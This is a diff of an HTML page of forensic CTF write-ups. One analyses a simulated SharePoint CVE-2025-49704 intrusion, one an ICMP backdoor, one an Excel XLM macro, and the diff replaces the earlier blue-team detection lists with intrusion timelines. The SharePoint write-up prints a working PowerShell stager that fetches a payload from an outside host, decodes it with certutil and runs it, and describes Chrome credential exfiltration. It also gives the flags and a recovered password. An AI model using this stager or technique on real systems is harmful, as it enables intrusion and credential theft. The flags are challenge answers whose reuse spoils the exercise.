@@ -1238,14 +1238,15 @@
     <template id="writeup-gimme-your-point">
         <div class="writeup-content">
             <div class="writeup-summary">
-                <h4 data-i18n="writeup_gimme_h_summary">📋 Executive Summary</h4>
-                <p data-i18n="writeup_gimme_summary">A sophisticated attack simulation exploiting
-                    <strong>CVE-2025-49704</strong>, a SharePoint deserialization vulnerability in the ToolShell
-                    component. This challenge recreates a real-world case study where attackers embed deserialization
-                    payloads into the <code>MSOTlPn_DWP</code> parameter of POST requests to achieve RCE and exfiltrate
-                    Chrome browser credentials.
-                </p>
+                <h4 data-i18n="writeup_gimme_h_summary">📋 Case Overview</h4>
+                <p data-i18n="writeup_gimme_summary">This forensic investigation reconstructs a multi-stage intrusion
+                    chain captured in a PCAP file. The attack leverages <strong>CVE-2025-49704</strong> — a critical
+                    SharePoint deserialization vulnerability in the ToolShell component — to achieve remote code
+                    execution, deploy a credential-stealing implant, and exfiltrate Chrome browser credentials to an
+                    attacker-controlled server.</p>
             </div>
+
+            <img src="assets/img/vcspassport2025/image1.png" alt="Challenge description — Gimme Your Point, 1000 points">
 
             <div class="writeup-mitre">
                 <h4 data-i18n="writeup_gimme_h_mitre">🎯 MITRE ATT&CK Mapping</h4>
@@ -1253,127 +1254,358 @@
                     <tr>
                         <th data-i18n="writeup_th_technique_id">Technique ID</th>
                         <th data-i18n="writeup_th_name">Name</th>
-                        <th data-i18n="writeup_th_description">Description</th>
+                        <th data-i18n="writeup_th_description">Observed Activity</th>
                     </tr>
                     <tr>
                         <td><code>T1190</code></td>
                         <td>Exploit Public-Facing Application</td>
-                        <td>SharePoint CVE-2025-49704</td>
+                        <td>SharePoint CVE-2025-49704 deserialization via <code>MSOTlPn_DWP</code></td>
                     </tr>
                     <tr>
                         <td><code>T1059.001</code></td>
                         <td>PowerShell</td>
-                        <td>Payload download & execution</td>
+                        <td>Payload staging via <code>Invoke-WebRequest</code> + <code>certutil</code> chain</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1140</code></td>
+                        <td>Deobfuscate/Decode Files</td>
+                        <td>Double <code>certutil -decode</code> to reconstruct executable from certificate blob</td>
                     </tr>
                     <tr>
                         <td><code>T1555.003</code></td>
                         <td>Credentials from Web Browsers</td>
-                        <td>Chrome Login Data theft</td>
+                        <td>Chrome <code>Login Data</code> (SQLite) and <code>Local State</code> (encryption key) theft</td>
                     </tr>
                     <tr>
                         <td><code>T1560.001</code></td>
                         <td>Archive Collected Data</td>
-                        <td>Password-protected ZIP</td>
+                        <td>Password-protected ZIP creation for collected credentials</td>
                     </tr>
                     <tr>
                         <td><code>T1041</code></td>
                         <td>Exfiltration Over C2 Channel</td>
-                        <td>HTTP POST upload</td>
+                        <td>HTTP POST multipart upload to attacker server</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1070.004</code></td>
+                        <td>File Deletion</td>
+                        <td>Self-cleanup of staging artifacts</td>
                     </tr>
                 </table>
             </div>
 
-            <h4 data-i18n="writeup_gimme_h_phase1">🔍 Phase 1: Initial PCAP Analysis</h4>
-            <p data-i18n="writeup_gimme_phase1">Opening the challenge PCAP file in Wireshark, I observed HTTP GET
-                requests returning a <code>start.aspx</code> file - indicating a web-based attack. I used
-                <strong>Wireshark's Export Objects</strong> feature to extract all HTTP files.
-            </p>
-            <img src="assets/img/vcspassport2025/image1.png" alt="HTTP object export">
+            <!-- Phase 1: Network Traffic Acquisition & Initial Triage -->
+            <h4 data-i18n="writeup_gimme_h_phase1">🔍 Phase 1: Network Traffic Acquisition & Initial Triage</h4>
+            <p data-i18n="writeup_gimme_phase1">The investigation begins with the provided PCAP file. Upon loading it
+                into Wireshark, an initial scan reveals HTTP traffic between the victim host and a remote server at
+                <code>30.243.67.129</code>. An HTTP GET request returning a <code>start.aspx</code> page is observed —
+                an immediate indicator of a web application-based attack targeting a SharePoint environment.</p>
+            <img src="assets/img/vcspassport2025/image2.png" alt="Wireshark PCAP overview — HTTP GET returning start.aspx">
 
-            <p data-i18n="writeup_gimme_phase1b">Using <code>strings</code> and <code>file</code> commands to analyze
-                extracted files, I discovered a suspicious encoded <code>CompressedDataTable</code> value in
-                <code>ToolPane.aspx</code>.
-            </p>
+            <p data-i18n="writeup_gimme_phase1b">Further examination reveals a POST request directed at
+                <code>ToolPane.aspx</code>, carrying a suspicious <code>CompressedDataTable</code> parameter — an
+                anomalous artifact warranting deeper inspection.</p>
+            <img src="assets/img/vcspassport2025/image3.png" alt="Wireshark — POST request to ToolPane.aspx with CompressedDataTable">
 
-            <h4 data-i18n="writeup_gimme_h_phase2">🔍 Phase 2: CVE Research - ToolShell Vulnerability</h4>
-            <p data-i18n="writeup_gimme_phase2">Searching for "CompressedDataTable SharePoint" led me to VCS's security
-                article about <strong>ToolShell</strong> - a critical SharePoint vulnerability chain being actively
-                exploited in the wild.</p>
-            <blockquote><strong>Key Discovery:</strong> This challenge simulates CVE-2025-49704, where attackers embed
-                deserialization payloads into the <code>MSOTlPn_DWP</code> parameter of POST requests.</blockquote>
+            <p data-i18n="writeup_gimme_phase1c">Using <strong>File &gt; Export Objects &gt; HTTP</strong>, all
+                transferred objects are systematically extracted for analysis:</p>
+            <table class="mitre-table">
+                <tr>
+                    <th>Packet</th>
+                    <th>Hostname</th>
+                    <th>Content Type</th>
+                    <th>Size</th>
+                    <th>Filename</th>
+                </tr>
+                <tr>
+                    <td>13</td>
+                    <td>30.243.67.129</td>
+                    <td>text/html</td>
+                    <td>24 KB</td>
+                    <td><code>start.aspx</code></td>
+                </tr>
+                <tr>
+                    <td>22</td>
+                    <td>30.243.67.129</td>
+                    <td>application/x-www-form-urlencoded</td>
+                    <td>4,221 bytes</td>
+                    <td><code>ToolPane.aspx</code></td>
+                </tr>
+                <tr>
+                    <td>383</td>
+                    <td>30.243.67.128:1234</td>
+                    <td>application/octet-stream</td>
+                    <td>5,257 KB</td>
+                    <td><code>raw_package</code></td>
+                </tr>
+                <tr>
+                    <td>547</td>
+                    <td>30.243.67.128:8000</td>
+                    <td>multipart/form-data</td>
+                    <td>299 KB</td>
+                    <td><code>upload</code></td>
+                </tr>
+            </table>
+            <img src="assets/img/vcspassport2025/image4.png" alt="Wireshark HTTP Object Export dialog">
 
-            <h4 data-i18n="writeup_gimme_h_phase3">🔍 Phase 3: Payload Decoding</h4>
-            <p data-i18n="writeup_gimme_phase3">I extracted the <code>CompressedDataTable</code> value and performed
-                Base64 decode → GZIP decompress, revealing a shell payload with a PowerShell command:</p>
-            <img src="assets/img/vcspassport2025/image13.png" alt="PowerShell payload">
+            <p data-i18n="writeup_gimme_phase1d">After saving all exported files, preliminary triage is performed using
+                <code>strings</code> and <code>file</code> commands. Within the <code>ToolPane.aspx</code>
+                form-urlencoded body, a Base64-encoded <code>CompressedDataTable</code> value is flagged as
+                suspicious.</p>
+
+            <!-- Phase 2: Vulnerability Identification -->
+            <h4 data-i18n="writeup_gimme_h_phase2">🔍 Phase 2: Vulnerability Identification — CVE-2025-49704</h4>
+            <p data-i18n="writeup_gimme_phase2">Searching for the keyword <strong>"CompressedDataTable
+                    SharePoint"</strong> leads to a critical intelligence source: a security advisory published by
+                Viettel Cyber Security (VCS) documenting <strong>ToolShell</strong> — a severe SharePoint vulnerability
+                chain actively exploited in the wild.</p>
+            <blockquote data-i18n="writeup_gimme_phase2_quote">The challenge simulates <strong>CVE-2025-49704</strong>,
+                wherein an attacker embeds a deserialization payload (XML/serialized .NET object) into the
+                <code>MSOTlPn_DWP</code> parameter of a POST request targeting SharePoint's ToolPane endpoint. Upon
+                deserialization by the server, the payload achieves arbitrary code execution.</blockquote>
+
+            <!-- Phase 3: Payload Extraction & Deobfuscation -->
+            <h4 data-i18n="writeup_gimme_h_phase3">🔍 Phase 3: Payload Extraction & Deobfuscation</h4>
+
+            <p data-i18n="writeup_gimme_phase3a"><strong>3.1 — Decompressing the CompressedDataTable:</strong> The
+                <code>CompressedDataTable</code> value extracted from <code>ToolPane.aspx</code> is loaded into
+                CyberChef for decoding.</p>
+            <img src="assets/img/vcspassport2025/image5.png"
+                alt="CyberChef — ToolPane.aspx content with CompressedDataTable value">
+
+            <p data-i18n="writeup_gimme_phase3b">Applying the standard SharePoint deserialization decoding pipeline —
+                <strong>Base64 Decode</strong> followed by <strong>GZIP Decompress</strong> — yields a .NET
+                deserialized XML structure containing a malicious shell invocation.</p>
+            <img src="assets/img/vcspassport2025/image6.png"
+                alt="Python script — Base64 decode + GZIP decompression revealing XML shell payload">
+
+            <p data-i18n="writeup_gimme_phase3c"><strong>3.2 — Extracting the PowerShell Stager:</strong> Within the
+                decompressed payload, the <code>&lt;MethodParameters&gt;</code> node contains another Base64-encoded
+                string. Decoding this in CyberChef reveals the actual attack command — a PowerShell stager responsible
+                for downloading, reconstructing, and executing the implant:</p>
+            <img src="assets/img/vcspassport2025/image7.png"
+                alt="CyberChef — Base64 decoding MethodParameters revealing PowerShell command">
 
             <pre><code class="language-powershell">powershell -c "Invoke-WebRequest -Uri http://30.243.67.128:1234/raw_package -OutFile C:\Windows\Temp\raw_package;
-Add-Content -Path C:\Windows\Temp\raw_package -Value [base64_data];
+Add-Content -Path C:\Windows\Temp\raw_package -Value bGVYQjFibU4wU1dOTVlqRkZSVVVBDQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0t -Encoding UTF8;
+Add-Content -Path C:\Windows\Temp\raw_package -Value DQo= -Encoding UTF8;
+Add-Content -Path C:\Windows\Temp\raw_package -Value '-----END CERTIFICATE-----' -Encoding UTF8;
 certutil -decode C:\Windows\Temp\raw_package C:\Windows\Temp\d1;
 certutil -decode C:\Windows\Temp\d1 C:\Windows\Temp\health_check.exe;
 del C:\Windows\Temp\raw_package; del C:\Windows\Temp\d1;
 C:\Windows\Temp\health_check.exe; sleep 10;
 del C:\Windows\Temp\health_check.exe"</code></pre>
 
-            <h4 data-i18n="writeup_gimme_h_phase4">🔍 Phase 4: Malware Analysis</h4>
-            <p data-i18n="writeup_gimme_phase4">Following the PowerShell steps, I obtained
-                <code>health_check.exe</code>. Running this executable revealed credential theft behavior:
-            </p>
+            <p data-i18n="writeup_gimme_phase3d"><strong>3.3 — Attack Chain Reconstruction:</strong> The stager
+                operates in a precise sequence designed to evade detection:</p>
+            <table class="mitre-table">
+                <tr>
+                    <th>Step</th>
+                    <th>Action</th>
+                    <th>Purpose</th>
+                </tr>
+                <tr>
+                    <td>1</td>
+                    <td><code>Invoke-WebRequest</code> downloads <code>raw_package</code></td>
+                    <td>Retrieve disguised payload from C2</td>
+                </tr>
+                <tr>
+                    <td>2</td>
+                    <td><code>Add-Content</code> appends Base64 padding + PEM trailer</td>
+                    <td>Complete the fake certificate structure</td>
+                </tr>
+                <tr>
+                    <td>3</td>
+                    <td>First <code>certutil -decode</code> → <code>d1</code></td>
+                    <td>Strip PEM envelope, recover intermediate binary</td>
+                </tr>
+                <tr>
+                    <td>4</td>
+                    <td>Second <code>certutil -decode</code> → <code>health_check.exe</code></td>
+                    <td>Decode final executable</td>
+                </tr>
+                <tr>
+                    <td>5</td>
+                    <td><code>del raw_package</code>, <code>del d1</code></td>
+                    <td>Anti-forensics: remove staging artifacts</td>
+                </tr>
+                <tr>
+                    <td>6</td>
+                    <td>Execute <code>health_check.exe</code></td>
+                    <td>Deploy credential stealer</td>
+                </tr>
+                <tr>
+                    <td>7</td>
+                    <td><code>sleep 10</code>, then <code>del health_check.exe</code></td>
+                    <td>Allow completion, then destroy implant</td>
+                </tr>
+            </table>
+            <p data-i18n="writeup_gimme_phase3e">This double <code>certutil</code> decode technique is a well-documented
+                <strong>Living-off-the-Land Binary (LOLBin)</strong> evasion method — the payload masquerades as a PEM
+                certificate at rest, bypassing content-based detection.</p>
+
+            <!-- Phase 4: Implant Behavioral Analysis -->
+            <h4 data-i18n="writeup_gimme_h_phase4">🔍 Phase 4: Implant Behavioral Analysis</h4>
+            <p data-i18n="writeup_gimme_phase4a">Following the stager's logic step by step, the final artifact
+                <code>health_check.exe</code> is reconstructed. Upon execution in an isolated environment, the implant
+                reveals its true behavior:</p>
+
+            <p data-i18n="writeup_gimme_phase4b"><strong>Observation 1:</strong> The implant invokes 7-Zip internally to
+                create a password-protected archive in <code>C:\Windows\Temp\</code>, using a GUID-named directory.</p>
+            <img src="assets/img/vcspassport2025/image8.png"
+                alt="Execution of health_check.exe — 7-Zip archiving 2 files into Temp">
+
+            <p data-i18n="writeup_gimme_phase4c"><strong>Observation 2:</strong> A folder with GUID
+                <code>{8E2FF114-0F24-4222-85B6-A86144C5157E}</code> is created, alongside its compressed
+                <code>.zip</code> counterpart.</p>
+            <img src="assets/img/vcspassport2025/image9.png"
+                alt="Windows Explorer — GUID-named folder and ZIP archive in Temp">
+
+            <p data-i18n="writeup_gimme_phase4d"><strong>Observation 3:</strong> Inside the GUID folder, two files are
+                staged for exfiltration:</p>
             <ul>
-                <li><code>chrome_health_result</code> - SQLite database (Chrome Login Data with saved passwords)</li>
-                <li><code>chrome_service_result</code> - Chrome Local State (encryption key for decrypting Login Data)
-                </li>
-                <li>Files compressed into <strong>password-protected ZIP</strong> and uploaded via POST</li>
+                <li><code>chrome_health_result</code> (40 KB) — Chrome <strong>Login Data</strong>: SQLite database
+                    storing saved usernames and passwords</li>
+                <li><code>chrome_service_result</code> (245 KB) — Chrome <strong>Local State</strong>: JSON file
+                    containing the DPAPI-encrypted key required to decrypt Login Data entries</li>
             </ul>
-            <img src="assets/img/vcspassport2025/image17.png" alt="Malware execution analysis">
+            <img src="assets/img/vcspassport2025/image10.png"
+                alt="Staging folder contents — chrome_health_result and chrome_service_result">
 
-            <h4 data-i18n="writeup_gimme_h_phase5">💡 Phase 5: The Breakthrough - IDA Reverse Engineering</h4>
-            <p data-i18n="writeup_gimme_breakthrough">Returning to the PCAP, I found a POST request to
-                <code>/upload</code> with the exfiltrated ZIP (signature <code>50 4b 03 04</code>). The ZIP required a
-                password, so I loaded <code>health_check.exe</code> into <strong>IDA Pro</strong>.
+            <p data-i18n="writeup_gimme_phase4e"><strong>Verification:</strong> Opening
+                <code>chrome_health_result</code> confirms the SQLite magic header (<code>SQLite format 3</code>),
+                consistent with Chrome's Login Data database. The <code>chrome_service_result</code> contains a JSON
+                structure with Chrome's <code>accessibility</code>, <code>autofill</code>, and
+                <code>os_crypt.encrypted_key</code> fields — the AES-256-GCM key used to decrypt credential entries.
             </p>
+            <img src="assets/img/vcspassport2025/image11.png"
+                alt="chrome_health_result — SQLite format header visible">
+            <img src="assets/img/vcspassport2025/image12.png"
+                alt="chrome_service_result — Chrome Local State JSON structure">
 
-            <p data-i18n="writeup_gimme_ida">Searching for "pass" revealed three functions: <code>GenPass1</code>,
-                <code>GenPass2</code>, <code>GenPass3</code>. Following these in IDA View-A, I reconstructed the
-                password:
-            </p>
+            <!-- Phase 5: Exfiltration Channel Discovery -->
+            <h4 data-i18n="writeup_gimme_h_phase5">🔍 Phase 5: Exfiltration Channel Discovery</h4>
+            <p data-i18n="writeup_gimme_phase5a">Returning to the PCAP for further evidence, a previously unexamined
+                HTTP POST request to the <code>/upload</code> endpoint on <code>30.243.67.128:8000</code> is
+                identified — the exfiltration channel.</p>
+            <img src="assets/img/vcspassport2025/image14.png"
+                alt="Wireshark — POST /upload request showing exfiltrated data">
+
+            <p data-i18n="writeup_gimme_phase5b">The raw bytes of the uploaded content begin with signature
+                <code>50 4B 03 04</code> — the unmistakable magic bytes of a <strong>ZIP archive</strong>. File entry
+                headers within the archive confirm the presence of <code>chrome_health_result</code> and
+                <code>chrome_service_result</code>.</p>
+            <img src="assets/img/vcspassport2025/image13.png"
+                alt="Hex dump — PK signature (50 4B 03 04) and archived file names visible">
+
+            <p data-i18n="writeup_gimme_phase5c">The exfiltrated ZIP is extracted from the PCAP, renamed with a
+                <code>.zip</code> extension, and an extraction attempt is made — only to be met with a
+                <strong>password prompt</strong>.</p>
+            <img src="assets/img/vcspassport2025/image15.png"
+                alt="WinRAR password prompt — exfiltrated ZIP is password-protected">
+
+            <!-- Phase 6: Confirming Password-Protected Exfiltration -->
+            <h4 data-i18n="writeup_gimme_h_phase6">🔍 Phase 6: Confirming Password-Protected Exfiltration</h4>
+            <p data-i18n="writeup_gimme_phase6">Recalling that <code>health_check.exe</code> also created a local ZIP
+                archive during execution, a test extraction is attempted. The same password prompt appears — confirming
+                that the implant embeds a <strong>hardcoded password</strong> used to protect the exfiltrated archive.
+                The ZIP password is baked into the binary itself.</p>
+            <img src="assets/img/vcspassport2025/image16.png"
+                alt="WinRAR password prompt for locally generated ZIP — same protection mechanism">
+
+            <!-- Phase 7: Static Analysis — Password Recovery -->
+            <h4 data-i18n="writeup_gimme_h_phase7">💡 Phase 7: Static Analysis — Password Recovery via Reverse
+                Engineering</h4>
+            <p data-i18n="writeup_gimme_phase7a">The binary is loaded into <strong>IDA Pro</strong> for static
+                analysis. A string search for the keyword <code>"pass"</code> reveals three functions of immediate
+                interest: <code>GenPass1</code>, <code>GenPass2</code>, <code>GenPass3</code> — clearly responsible
+                for constructing the ZIP password at runtime.</p>
+            <img src="assets/img/vcspassport2025/image17.png"
+                alt="IDA Pro — Function list showing GenPass1, GenPass2, GenPass3">
+
+            <p data-i18n="writeup_gimme_phase7b">Following the cross-references into the <code>.data</code> segment
+                (IDA View-A), the password fragments are located as UTF-16LE string literals:</p>
+            <img src="assets/img/vcspassport2025/image18.png"
+                alt="IDA View-A — Data segment revealing password fragments">
+
+            <p data-i18n="writeup_gimme_phase7c">After reconstructing and testing several combinations of the
+                identified fragments, the full password is recovered:</p>
             <blockquote><code>sup3r_S3(ReT_p4$$wod</code></blockquote>
-            <img src="assets/img/vcspassport2025/image20.png" alt="IDA GenPass analysis">
 
-            <p data-i18n="writeup_gimme_flag">Using this password to extract the ZIP, I examined
-                <code>chrome_health_result</code> and found the URL containing the flag.
-            </p>
+            <!-- Phase 8: Flag Recovery -->
+            <h4 data-i18n="writeup_gimme_h_phase8">🚩 Phase 8: Flag Recovery</h4>
+            <p data-i18n="writeup_gimme_phase8a">With the recovered password, the exfiltrated ZIP archive is
+                successfully extracted.</p>
+            <img src="assets/img/vcspassport2025/image19.png"
+                alt="WinRAR — successful extraction with recovered password">
 
+            <p data-i18n="writeup_gimme_phase8b">The <code>chrome_health_result</code> SQLite database is opened and
+                its contents examined. Within the <code>logins</code> table — where Chrome stores saved credentials — a
+                URL entry is discovered:</p>
+            <blockquote><code>https://flag.win.here/SH4R3_y0R_P$$wD</code></blockquote>
+            <img src="assets/img/vcspassport2025/image20.png"
+                alt="chrome_health_result — flag URL highlighted in logins table">
+
+            <!-- Intrusion Timeline -->
             <div class="writeup-detection">
-                <h4 data-i18n="writeup_gimme_h_detection">🛡️ Detection Strategy (Blue Team)</h4>
-                <ul>
-                    <li data-i18n="writeup_gimme_detect1"><strong>Network:</strong> Monitor SharePoint for anomalous
-                        <code>CompressedDataTable</code>
-                        parameters
-                    </li>
-                    <li data-i18n="writeup_gimme_detect2"><strong>Endpoint:</strong> Alert on
-                        <code>certutil -decode</code> execution chains
-                    </li>
-                    <li data-i18n="writeup_gimme_detect3"><strong>Behavioral:</strong> Detect Chrome database access by
-                        non-browser processes</li>
-                    <li data-i18n="writeup_gimme_detect4"><strong>Exfiltration:</strong> Monitor ZIP creation in
-                        <code>C:\Windows\Temp</code> with
-                        immediate uploads
-                    </li>
-                </ul>
+                <h4 data-i18n="writeup_gimme_h_timeline">📊 Intrusion Timeline Reconstruction</h4>
+                <table class="mitre-table">
+                    <tr>
+                        <th>Seq</th>
+                        <th>Activity</th>
+                        <th>Evidence</th>
+                    </tr>
+                    <tr>
+                        <td>T+0</td>
+                        <td>Crafted POST to <code>ToolPane.aspx</code> with deserialization payload</td>
+                        <td>PCAP — Packet #22</td>
+                    </tr>
+                    <tr>
+                        <td>T+1</td>
+                        <td>SharePoint deserializes payload, executes PowerShell stager</td>
+                        <td>Decoded CompressedDataTable</td>
+                    </tr>
+                    <tr>
+                        <td>T+2</td>
+                        <td>PowerShell downloads <code>raw_package</code> from C2</td>
+                        <td>PCAP — Packet #383</td>
+                    </tr>
+                    <tr>
+                        <td>T+3</td>
+                        <td>Double <code>certutil -decode</code> reconstructs <code>health_check.exe</code></td>
+                        <td>PowerShell command analysis</td>
+                    </tr>
+                    <tr>
+                        <td>T+4</td>
+                        <td>Implant copies Chrome credentials, creates password-protected ZIP</td>
+                        <td>Behavioral analysis</td>
+                    </tr>
+                    <tr>
+                        <td>T+5</td>
+                        <td>ZIP uploaded via POST to <code>30.243.67.128:8000/upload</code></td>
+                        <td>PCAP — Packet #547</td>
+                    </tr>
+                    <tr>
+                        <td>T+6</td>
+                        <td>Staging artifacts deleted</td>
+                        <td>PowerShell command analysis</td>
+                    </tr>
+                </table>
             </div>
 
-            <blockquote><strong>Flag:</strong> VCSPassport{SH4R3_y0R_P$$wD}</blockquote>
+            <blockquote><strong>Flag:</strong> <code>VCSPassport{SH4R3_y0R_P$$wD}</code></blockquote>
         </div>
     </template>
 
     <template id="writeup-for2-icmp">
         <div class="writeup-content">
             <div class="writeup-summary">
-                <h4>📋 Executive Summary</h4>
-                <p data-i18n="writeup_for2_summary">Network forensics revealing covert C2 communication via ICMP
-                    protocol. Attacker utilized ping packets to execute commands and exfiltrate sensitive data—a classic
-                    example of data exfiltration over alternative protocols.</p>
+                <h4 data-i18n="writeup_for2_h_summary">📋 Case Overview</h4>
+                <p data-i18n="writeup_for2_summary">This forensic investigation analyzes captured network traffic to
+                    uncover a covert C2 channel operating over the ICMP protocol. The attacker exploited a custom
+                    backdoor (<code>oci.bin</code>) to issue commands via ICMP Echo Request/Reply packets, exfiltrating
+                    sensitive file contents from the compromised host through an unconventional data channel that
+                    bypasses traditional firewall rules.</p>
             </div>
 
             <div class="writeup-mitre">
@@ -1382,63 +1614,121 @@ del C:\Windows\Temp\health_check.exe"</code></pre>
                     <tr>
                         <th>Technique ID</th>
                         <th>Name</th>
-                        <th>Description</th>
+                        <th>Observed Activity</th>
                     </tr>
                     <tr>
                         <td><code>T1095</code></td>
                         <td>Non-Application Layer Protocol</td>
-                        <td>ICMP for C2 communication</td>
+                        <td>ICMP used as C2 communication channel</td>
                     </tr>
                     <tr>
                         <td><code>T1048.003</code></td>
                         <td>Exfiltration Over Alternative Protocol</td>
-                        <td>Data hidden in ICMP packets</td>
+                        <td>File data hidden within ICMP packet payloads</td>
                     </tr>
                     <tr>
                         <td><code>T1041</code></td>
                         <td>Exfiltration Over C2 Channel</td>
-                        <td>Flag file extraction</td>
+                        <td>Flag file extracted through the ICMP tunnel</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1001</code></td>
+                        <td>Data Obfuscation</td>
+                        <td>Flag encoded as ASCII art across multiple packets</td>
                     </tr>
                 </table>
             </div>
 
-            <h4>🔍 Technical Analysis</h4>
-            <p data-i18n="writeup_for2_intro">PCAP containing ICMP backdoor traffic with command execution revealed
-                through Wireshark analysis.</p>
-            <img src="assets/img/vcspassport2024/image1.png" alt="ICMP traffic analysis">
+            <!-- Phase 1: Evidence Acquisition -->
+            <h4 data-i18n="writeup_for2_h_phase1">🔍 Phase 1: Evidence Acquisition & Initial Triage</h4>
+            <p data-i18n="writeup_for2_phase1">The challenge provides two artifacts: a <strong>PCAPNG file</strong>
+                containing network traffic from the victim host, and <code>oci.bin</code> — the attacker's backdoor
+                binary. Upon opening the PCAPNG in Wireshark and filtering by protocol, ICMP Echo Request and Reply
+                packets are immediately visible. The payloads are notably larger than standard ping traffic, suggesting
+                embedded data.</p>
+            <img src="assets/img/vcspassport2024/image1.png"
+                alt="Wireshark — ICMP traffic overview with embedded data in payloads">
 
-            <p data-i18n="writeup_for2_analysis">ICMP packets contained ASCII commands like
-                <code>download C:\tmp\flag_1s_ck4mpj0n.txt</code>. TCP stream confirmed command execution.
-            </p>
-            <img src="assets/img/vcspassport2024/image2.png" alt="ICMP command packet">
-            <img src="assets/img/vcspassport2024/image3.png" alt="TCP confirmation">
+            <!-- Phase 2: C2 Command Discovery -->
+            <h4 data-i18n="writeup_for2_h_phase2">🔍 Phase 2: C2 Command Discovery</h4>
+            <p data-i18n="writeup_for2_phase2">Examination of individual ICMP packet payloads reveals embedded ASCII
+                command strings. A critical packet contains:
+                <code>download C:\tmp\flag_1s_ck4mpj0n.txt</code> — the attacker is using the ICMP protocol as a
+                covert C2 channel to exfiltrate the target file.</p>
+            <img src="assets/img/vcspassport2024/image2.png"
+                alt="Wireshark — ICMP packet with download command for flag file">
 
-            <h4>💡 The Breakthrough</h4>
-            <p data-i18n="writeup_for2_breakthrough">Subsequent packets contained ASCII art spelling the flag in
-                stylized text format.</p>
-            <img src="assets/img/vcspassport2024/image5.png" alt="ASCII art extraction">
+            <!-- Phase 3: Execution Confirmation -->
+            <h4 data-i18n="writeup_for2_h_phase3">🔍 Phase 3: Command Execution Confirmation</h4>
+            <p data-i18n="writeup_for2_phase3">Following the packet stream, a TCP packet appears immediately afterwards
+                containing: <code>openfile on remote computers success</code> — confirming the backdoor successfully
+                executed the download command.</p>
+            <img src="assets/img/vcspassport2024/image3.png"
+                alt="Wireshark — TCP stream confirming successful file access">
 
+            <!-- Phase 4: Data Exfiltration -->
+            <h4 data-i18n="writeup_for2_h_phase4">🔍 Phase 4: Data Exfiltration via Encoded Packets</h4>
+            <p data-i18n="writeup_for2_phase4">Below the confirmation, a series of subsequent packets carry payloads
+                filled with unusual character sequences — printable characters arranged in patterns not immediately
+                recognizable.</p>
+            <img src="assets/img/vcspassport2024/image4.png"
+                alt="Wireshark — Exfiltration packets with encoded character data (part 1)">
+            <img src="assets/img/vcspassport2024/image5.png"
+                alt="Wireshark — Exfiltration packets with encoded character data (part 2)">
+
+            <!-- Phase 5: Flag Recovery -->
+            <h4 data-i18n="writeup_for2_h_phase5">🚩 Phase 5: Flag Recovery</h4>
+            <p data-i18n="writeup_for2_phase5">All suspicious packet payloads are extracted and concatenated into a
+                text file. The combined output reveals <strong>ASCII art</strong> — stylized block characters spelling
+                out the flag.</p>
+            <img src="assets/img/vcspassport2024/image6.png"
+                alt="Text editor — Extracted ASCII art revealing the flag: VCS{I_AM_LOSER}">
+
+            <!-- Intrusion Timeline -->
             <div class="writeup-detection">
-                <h4>🛡️ Detection Strategy (Blue Team)</h4>
-                <ul>
-                    <li>Monitor for unusual ICMP packet sizes (&gt;100 bytes)</li>
-                    <li>Alert on printable ASCII characters in ICMP payloads</li>
-                    <li>Detect command strings like "download", "openfile" in ICMP</li>
-                    <li>Correlate ICMP spikes with TCP data transfers</li>
-                </ul>
+                <h4 data-i18n="writeup_for2_h_timeline">📊 Intrusion Timeline</h4>
+                <table class="mitre-table">
+                    <tr>
+                        <th>Seq</th>
+                        <th>Activity</th>
+                        <th>Evidence</th>
+                    </tr>
+                    <tr>
+                        <td>T+0</td>
+                        <td>Attacker deploys <code>oci.bin</code> backdoor</td>
+                        <td>Challenge artifacts</td>
+                    </tr>
+                    <tr>
+                        <td>T+1</td>
+                        <td>C2 command: <code>download C:\tmp\flag_1s_ck4mpj0n.txt</code></td>
+                        <td>ICMP Echo Request payload</td>
+                    </tr>
+                    <tr>
+                        <td>T+2</td>
+                        <td>Backdoor confirms: <code>openfile on remote computers success</code></td>
+                        <td>TCP stream</td>
+                    </tr>
+                    <tr>
+                        <td>T+3</td>
+                        <td>File contents exfiltrated as ASCII art across multiple packets</td>
+                        <td>Packet payload analysis</td>
+                    </tr>
+                </table>
             </div>
 
-            <blockquote><strong>Flag:</strong> VCS{I_AM_LOSER}</blockquote>
+            <blockquote><strong>Flag:</strong> <code>VCS{I_AM_LOSER}</code></blockquote>
         </div>
     </template>
 
     <template id="writeup-re02-macro">
         <div class="writeup-content">
             <div class="writeup-summary">
-                <h4>📋 Executive Summary</h4>
-                <p data-i18n="writeup_re02_summary">Analysis of an obfuscated XLM (Excel 4.0) macro embedded in a
-                    malicious Excel document. The macro launches calculator as a decoy while hiding the flag through
-                    string manipulation across multiple cells.</p>
+                <h4 data-i18n="writeup_re02_h_summary">📋 Case Overview</h4>
+                <p data-i18n="writeup_re02_summary">This investigation dissects a malicious Excel document
+                    (<code>RE02.xls</code>) containing an obfuscated XLM (Excel 4.0) macro. The macro's visible
+                    behavior — launching <code>calc.exe</code> — serves as a decoy, while the flag is concealed through
+                    multi-cell string fragmentation and reversal obfuscation. The analysis demonstrates why raw string
+                    extraction can be misleading and why specialized OLE tools are essential.</p>
             </div>
 
             <div class="writeup-mitre">
@@ -1447,64 +1737,106 @@ del C:\Windows\Temp\health_check.exe"</code></pre>
                     <tr>
                         <th>Technique ID</th>
                         <th>Name</th>
-                        <th>Description</th>
+                        <th>Observed Activity</th>
                     </tr>
                     <tr>
                         <td><code>T1059.005</code></td>
-                        <td>Visual Basic</td>
-                        <td>XLM macro execution</td>
+                        <td>Command and Scripting Interpreter: Visual Basic</td>
+                        <td>XLM (Excel 4.0) macro execution</td>
                     </tr>
                     <tr>
                         <td><code>T1204.002</code></td>
-                        <td>Malicious File</td>
-                        <td>User opens infected Excel</td>
+                        <td>User Execution: Malicious File</td>
+                        <td>User opens infected Excel document</td>
                     </tr>
                     <tr>
                         <td><code>T1027</code></td>
-                        <td>Obfuscated Files</td>
-                        <td>String reversal/splitting</td>
+                        <td>Obfuscated Files or Information</td>
+                        <td>String reversal and multi-cell fragmentation</td>
                     </tr>
                     <tr>
                         <td><code>T1140</code></td>
-                        <td>Deobfuscate</td>
-                        <td>Runtime string assembly</td>
+                        <td>Deobfuscate/Decode Files</td>
+                        <td>Runtime string assembly from scattered cells</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1036</code></td>
+                        <td>Masquerading</td>
+                        <td>Decoy <code>calc.exe</code> execution</td>
                     </tr>
                 </table>
             </div>
 
-            <h4>🔍 Technical Analysis</h4>
